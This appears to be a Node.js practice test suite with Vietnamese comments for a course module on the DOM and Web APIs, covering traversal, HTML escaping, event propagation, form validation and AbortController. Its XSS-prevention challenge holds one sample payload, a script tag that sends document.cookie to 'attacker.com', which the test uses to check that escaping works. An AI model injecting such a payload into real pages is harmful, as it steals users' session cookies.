/**
 * practice.js - Module 06: DOM & Web APIs Test Suite
 * Chạy độc lập: node practice.js
 * Bộ kiểm tra toàn diện 5 thử thách nâng cao:
 * 1. DOM Architecture & Traversal (Static NodeList vs Tree Navigation)
 * 2. Safe DOM Mutation & Batching (DocumentFragment & Sanitization)
 * 3. Event Propagation & Delegation Engine (Capturing, Target, Bubbling, StopPropagation)
 * 4. Constraint Validation API & FormData Processing
 * 5. Modern Event Lifecycle with AbortController & Delta Time Physics
 */

import assert from "node:assert/strict";

console.log("=== BẮT ĐẦU BÀI THỰC HÀNH TỔNG HỢP: MODULE 06 - DOM & WEB APIS ===");

// -------------------------------------------------------------
// THỬ THÁCH 1: DOM TRAVERSAL & CLOSEST SELECTOR ENGINE
// -------------------------------------------------------------
console.log("-> Thử thách 1: DOM Traversal & Closest Matching...");

class MockNode {
  constructor(nodeName, nodeType = 1) { // 1 = Element, 3 = Text, 8 = Comment
    this.nodeName = nodeName;
    this.nodeType = nodeType;
    this.parentNode = null;
    this.childNodes = [];
    this.classList = new Set();
    this.dataset = {};
  }

  get children() {
    return this.childNodes.filter((n) => n.nodeType === 1);
  }

  get parentElement() {
    return this.parentNode && this.parentNode.nodeType === 1 ? this.parentNode : null;
  }

  appendChild(child) {
    child.parentNode = this;
    this.childNodes.push(child);
    return child;
  }

  // Thuật toán closest mô phỏng Element.prototype.closest()
  closest(selector) {
    let current = this;
    while (current && current.nodeType === 1) {
      if (selector.startsWith(".") && current.classList.has(selector.slice(1))) {
        return current;
      }
      if (selector.toLowerCase() === current.nodeName.toLowerCase()) {
        return current;
      }
      current = current.parentElement;
    }
    return null;
  }
}

// Xây dựng cây phân cấp:
// root (div.app) -> section.card -> p (text) + button.btn-delete
const root = new MockNode("DIV");
root.classList.add("app");

const card = new MockNode("SECTION");
card.classList.add("card");
root.appendChild(card);

const textNode = new MockNode("#text", 3);
card.appendChild(textNode);

const btn = new MockNode("BUTTON");
btn.classList.add("btn-delete");
card.appendChild(btn);

// Assert Node vs Element
assert.equal(card.childNodes.length, 2, "childNodes gồm cả text node");
assert.equal(card.children.length, 1, "children chỉ chứa button element");
assert.equal(card.children[0].nodeName, "BUTTON");

// Assert closest()
assert.equal(btn.closest(".card"), card, "Tìm thấy card cha gần nhất");
assert.equal(btn.closest(".app"), root, "Tìm thấy root ông nội");
assert.equal(btn.closest(".non-existent"), null, "Không khớp trả về null");

console.log("   ✓ Thử thách 1 hoàn thành xuất sắc!");

// -------------------------------------------------------------
// THỬ THÁCH 2: SAFE DOM MUTATION & SANITIZATION
// -------------------------------------------------------------
console.log("-> Thử thách 2: Safe DOM Mutation & XSS Prevention...");

function sanitizeAndFormatHTML(rawString) {
  // Thay thế các ký tự nhạy cảm để ngăn chặn Stored/Reflected XSS
  return rawString
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

const maliciousPayload = '<script>fetch("http://attacker.com?cookie=" + document.cookie)</script>';
const safeEscaped = sanitizeAndFormatHTML(maliciousPayload);

assert.equal(safeEscaped.includes("<script>"), false, "Không còn thẻ script thực thi");
assert.equal(safeEscaped.includes("&lt;script&gt;"), true, "Thẻ đã được chuyển thành HTML Entities an toàn");

// Document Fragment Batching
class MockFragment {
  constructor() {
    this.children = [];
  }
  append(node) {
    this.children.push(node);
  }
}

const fragment = new MockFragment();
for (let i = 0; i < 5; i++) {
  const item = new MockNode("LI");
  fragment.append(item);
}
assert.equal(fragment.children.length, 5, "Fragment gom đủ 5 nodes trước khi gắn vào DOM");

console.log("   ✓ Thử thách 2 hoàn thành xuất sắc!");

// -------------------------------------------------------------
// THỬ THÁCH 3: EVENT PROPAGATION & DELEGATION ENGINE
// -------------------------------------------------------------
console.log("-> Thử thách 3: Event Propagation & Delegation Engine...");

class DOMEvent {
  constructor(type, target) {
    this.type = type;
    this.target = target;
    this.currentTarget = null;
    this.eventPhase = 0; // 1 = CAPTURING, 2 = AT_TARGET, 3 = BUBBLING
    this._propagationStopped = false;
  }

  stopPropagation() {
    this._propagationStopped = true;
  }
}

function simulateEventDispatch(targetElement, eventType, stopAtCard = false) {
  const path = [];
  let curr = targetElement;
  while (curr) {
    path.push(curr);
    curr = curr.parentElement;
  }

  const logs = [];
  const event = new DOMEvent(eventType, targetElement);

  // 1. CAPTURING PHASE (từ gốc xuống target)
  event.eventPhase = 1;
  for (let i = path.length - 1; i > 0; i--) {
    const el = path[i];
    logs.push(`CAPTURE:${el.nodeName}`);
  }

  // 2. TARGET PHASE
  event.eventPhase = 2;
  logs.push(`TARGET:${targetElement.nodeName}`);

  // 3. BUBBLING PHASE (từ con ngược lên gốc)
  event.eventPhase = 3;
  for (let i = 1; i < path.length; i++) {
    const el = path[i];
    if (stopAtCard && el.nodeName === "SECTION") {
      event.stopPropagation();
      logs.push(`BUBBLE:${el.nodeName}`);
      break; // Dừng lan truyền
    }
    logs.push(`BUBBLE:${el.nodeName}`);
  }

  return logs;
}

const normalFlow = simulateEventDispatch(btn, "click", false);
assert.deepEqual(normalFlow, [
  "CAPTURE:DIV",
  "CAPTURE:SECTION",
  "TARGET:BUTTON",
  "BUBBLE:SECTION",
  "BUBBLE:DIV",
]);

// Chặn lan truyền tại thẻ SECTION
const stoppedFlow = simulateEventDispatch(btn, "click", true);
assert.deepEqual(stoppedFlow, [
  "CAPTURE:DIV",
  "CAPTURE:SECTION",
  "TARGET:BUTTON",
  "BUBBLE:SECTION",
]);
assert.equal(stoppedFlow.includes("BUBBLE:DIV"), false, "stopPropagation đã ngăn bubble lên DIV cha");

console.log("   ✓ Thử thách 3 hoàn thành xuất sắc!");

// -------------------------------------------------------------
// THỬ THÁCH 4: CONSTRAINT VALIDATION API & FORMDATA
// -------------------------------------------------------------
console.log("-> Thử thách 4: Constraint Validation & FormData Native...");

class FormField {
  constructor({ name, type = "text", value = "", required = false, minLength = 0 }) {
    this.name = name;
    this.type = type;
    this.value = value;
    this.required = required;
    this.minLength = minLength;
    this.customError = "";
  }

  checkValidity() {
    if (this.customError) return false;
    if (this.required && (!this.value || this.value.trim() === "")) return false;
    if (this.minLength > 0 && this.value.length < this.minLength) return false;
    if (this.type === "number" && isNaN(Number(this.value))) return false;
    return true;
  }

  setCustomValidity(msg) {
    this.customError = msg || "";
  }
}

const passwordField = new FormField({
  name: "password",
  type: "text",
  value: "123",
  required: true,
  minLength: 8,
});

assert.equal(passwordField.checkValidity(), false, "Mật khẩu 3 ký tự vi phạm minLength 8");
passwordField.value = "SecurePass123!";
assert.equal(passwordField.checkValidity(), true, "Mật khẩu đạt độ dài hợp lệ");

passwordField.setCustomValidity("Mật khẩu bị lộ trong dữ liệu breach");
assert.equal(passwordField.checkValidity(), false, "Custom validity kích hoạt lỗi");
passwordField.setCustomValidity("");
assert.equal(passwordField.checkValidity(), true, "Xóa custom validity hồi phục tính hợp lệ");

// Native FormData kiểm tra đa trường
const testFormData = new FormData();
testFormData.append("category", "tech");
testFormData.append("category", "science");
testFormData.append("token", "xyz-789");

assert.deepEqual(testFormData.getAll("category"), ["tech", "science"]);
assert.equal(testFormData.get("token"), "xyz-789");

console.log("   ✓ Thử thách 4 hoàn thành xuất sắc!");

// -------------------------------------------------------------
// THỬ THÁCH 5: ABORTCONTROLLER LIFECYCLE & DELTA TIME PHYSICS
// -------------------------------------------------------------
console.log("-> Thử thách 5: AbortController Lifecycle & Delta Time Physics...");

// A. AbortController dọn dẹp hàng loạt listeners
const lifecycleController = new AbortController();
let activeListeners = 3;

function createCancellableListener(signal) {
  signal.addEventListener("abort", () => {
    activeListeners--;
  });
}

createCancellableListener(lifecycleController.signal);
createCancellableListener(lifecycleController.signal);
createCancellableListener(lifecycleController.signal);

assert.equal(activeListeners, 3);
lifecycleController.abort();
assert.equal(activeListeners, 0, "Toàn bộ 3 listeners được dọn sạch sau abort()");

// B. Physics Delta Time độc lập FPS
function calculateDisplacement(speedPxPerSec, deltaTimeMs) {
  return speedPxPerSec * (deltaTimeMs / 1000);
}

const speed = 120; // 120px / s
// Chạy ở 60 FPS (16.666ms 1 frame x 60 lần)
let totalDistance60Fps = 0;
for (let frame = 0; frame < 60; frame++) {
  totalDistance60Fps += calculateDisplacement(speed, 1000 / 60);
}

// Chạy ở 120 FPS (8.333ms 1 frame x 120 lần)
let totalDistance120Fps = 0;
for (let frame = 0; frame < 120; frame++) {
  totalDistance120Fps += calculateDisplacement(speed, 1000 / 120);
}

assert.equal(Math.round(totalDistance60Fps), 120, "60 FPS di chuyển 120px sau 1s");
assert.equal(Math.round(totalDistance120Fps), 120, "120 FPS di chuyển 120px sau 1s");

console.log("   ✓ Thử thách 5 hoàn thành xuất sắc!");

console.log("\n=======================================================");
console.log("-> KẾT QUẢ: 5/5 THỬ THÁCH MODULE 06 ĐÃ VƯỢT QUA 100%!");
console.log("=======================================================");
